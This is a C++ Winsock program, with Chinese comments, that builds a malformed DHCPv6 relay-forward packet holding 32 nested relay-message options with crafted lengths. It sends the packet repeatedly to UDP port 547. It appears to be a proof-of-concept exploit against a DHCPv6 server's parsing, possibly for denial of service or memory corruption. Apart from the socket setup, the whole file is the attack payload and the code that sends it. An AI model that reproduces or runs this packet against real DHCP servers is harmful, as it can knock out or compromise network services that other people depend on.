
#include <winsock2.h>
#include <ws2tcpip.h>
#include <iostream>

#pragma comment(lib, "Ws2_32.lib")

int main() {
    char data[] =
        "\x0c\x03\xa4\xf2\x00\x08\x00\x02\x00\x00\x00\x01\x00\x0e\x00\x01"
        "\x00\x01\x2b\x07\x5b\xc1\x00\x0c\x29\xe8\x6b\x79\x00\x03\x00\x0c"
        "\x07\x00"




        "\x00\x09\x00\x86\x0c\x02"//0x3a+0x26*2

        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        "\x00\x09\x00\x60\x0c\x02"//0x3a+0x26

        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        "\x00\x09\x00\x3a\x0c\x01"

        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

        "\x00\x09\x00\x14\x01\x07\x00\x00"
        "\x00\x02\x00\x04\x01\x07\x00\x00"
        "\x00\x01\x00\x04\x01\x07\x00\x00"

        ;

    char par1[] =
        "\x00\x09\x0a\x9b\x0c\x01"
        "\xff\xff\xff\xff\xff\xff\xff\x00\x00\x00\x00\x00\x00\x00\x00\x00"
        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
    char par2[] =
        "\x00\x09\x00\x14\x01\x07\x00\x00"
        "\x00\x02\x00\x04\x01\x07\x00\x00"
        "\x00\x01\x00\x04\x01\x07\x00\x00"
        ;



    char data1[0x1000] =
        "\x0c\x20\xa4\xf2\x00\x08\x00\x02\x00\x00\x00\x01\x00\x0e\x00\x01"
        "\x00\x01\x2b\x07\x5b\xc1\x00\x0c\x29\xe8\x6b\x79\x00\x03\x00\x0c"
        "\x07\x00"

        ;

    int num = 0x1f;
    int total_len = 0x14 + 0x26 * (num + 1);
    for (int i = 0; i <= num; i++)
    {
        memset(par1 + 5, num - i, 1);
        short temp = htons(total_len - i * 0x26);

        memcpy(par1 + 2, &temp, 2);
        memcpy(data1 + 0x22 + 0x26 * i, par1, 0x26);
        if (i == num)
        {
            memcpy(data1 + 0x22 + 0x26 * i + 0x26, par2, 0x18);
        }

    }
    int sendlenth = 0x26 * (num + 1) + 0x22 + 0x18;
    // 初始化 Winsock
    WSADATA wsaData;
    int result = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (result != 0) {
        std::cerr << "WSAStartup failed with error: " << result << std::endl;
        return 1;
    }

    // 创建套接字
    SOCKET sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP);
    if (sock == INVALID_SOCKET) {
        std::cerr << "Failed to create socket: " << WSAGetLastError() << std::endl;
        WSACleanup();
        return 1;
    }

    // 设置套接字选项，允许发送广播
    int optVal = 1;
    if (setsockopt(sock, IPPROTO_IPV6, IPV6_MULTICAST_LOOP, (char*)&optVal, sizeof(optVal)) == SOCKET_ERROR) {
        std::cerr << "Failed to set socket option: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // 构建 DHCPv6 广播地址
    sockaddr_in6 destAddr = { 0 };
    destAddr.sin6_family = AF_INET6;
    destAddr.sin6_port = htons(547); // DHCPv6 默认端口号为 547
    InetPton(AF_INET6, L"2001:db7::1", &destAddr.sin6_addr); // DHCPv6 广播地址为 ff02::1:2

    // 发送 DHCPv6 广播消息
    int sendResult = 0;
    for (int i = 0; i < 0x10; i++)
    {
        sendResult = sendto(sock, data1, sendlenth, 0, (sockaddr*)&destAddr, sizeof(destAddr));
    }

    int m = GetLastError();
    if (sendResult == SOCKET_ERROR) {
        std::cerr << "Failed to send data: " << WSAGetLastError() << std::endl;
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    std::cout << "DHCPv6 Broadcast message sent!" << std::endl;

    // 清理资源
    closesocket(sock);
    WSACleanup();

    return 0;
}